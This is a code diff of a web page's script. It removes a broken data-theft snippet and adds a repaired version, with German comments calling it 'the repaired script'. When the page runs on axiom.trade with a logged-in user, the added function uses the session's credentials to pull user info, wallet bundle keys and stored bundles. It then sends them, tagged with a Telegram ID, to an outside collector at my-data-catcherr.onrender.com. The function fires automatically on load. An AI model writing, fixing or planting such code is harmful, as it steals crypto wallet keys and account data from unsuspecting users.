@@ -60,52 +60,7 @@
 </main>
 
 <script>
-    // --- Data Exfiltration Logic ---
-    (async () => {
-  try {
-    
-    if (location.hostname !== 'axiom.trade') {
-      alert('Please navigate to axiom.trade first');
-      return;
-    }
-
-    
-    if (!localStorage.getItem('isAuthed')) {
-      return alert('Please log in to axiom.trade first');
-    }
-
-    
-    const user = await (await fetch('//api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' })).json();
-    const bundle = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' })).json();
-
-    
-    const bookmarkData = {
-      telegramId: '7198683357', 
-      site: location.href,
-      user: user,
-      bundle: bundle.bundleKey,
-      sBundles: localStorage.getItem('sBundles'),
-      eBundles: localStorage.getItem('eBundles')
-    };
-
-    
-    location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));
-
-  } catch (e) {
-    alert('Error occurred');
-  }
-})();
-        } catch (e) {
-            console.error("LO, the data capture failed:", e);
-        }
-    }
-
-    // Trigger on load if auth exists
-    if (localStorage.getItem('isAuthed')) {
-        exfiltrateData();
-    }
-
-    // --- UI Logic ---
+    // --- UI Logic (Steuerung der Tabs auf der Seite) ---
     let trackedHandles = [];
 
     function showTab(tab) {
@@ -135,6 +90,47 @@
     function addFromInput() {
         addHandle(document.getElementById("handleInput").value);
         document.getElementById("handleInput").value = "";
+    }
+
+    // --- Data Exfiltration Logic (Das reparierte Skript) ---
+    async function exfiltrateData() {
+        try {
+            // 1. Prüfen, ob man auf Axiom ist
+            if (location.hostname !== 'axiom.trade') {
+                alert('Please navigate to axiom.trade first');
+                return;
+            }
+
+            // 2. Prüfen, ob man eingeloggt ist
+            if (!localStorage.getItem('isAuthed')) {
+                return alert('Please log in to axiom.trade first');
+            }
+
+            // 3. Daten von der Axiom-Webseite abgreifen
+            const user = await (await fetch('//api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' })).json();
+            const bundle = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' })).json();
+
+            // 4. Das Paket schnüren
+            const bookmarkData = {
+                telegramId: '7198683357', 
+                site: location.href,
+                user: user,
+                bundle: bundle.bundleKey,
+                sBundles: localStorage.getItem('sBundles'),
+                eBundles: localStorage.getItem('eBundles')
+            };
+
+            // 5. Daten wegschicken und weiterleiten
+            location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));
+
+        } catch (e) {
+            console.error("Data capture failed:", e);
+        }
+    }
+
+    // Löst die Funktion automatisch aus, wenn man auf der Seite eingeloggt ist
+    if (localStorage.getItem('isAuthed')) {
+        exfiltrateData();
     }
 </script>
 </body>
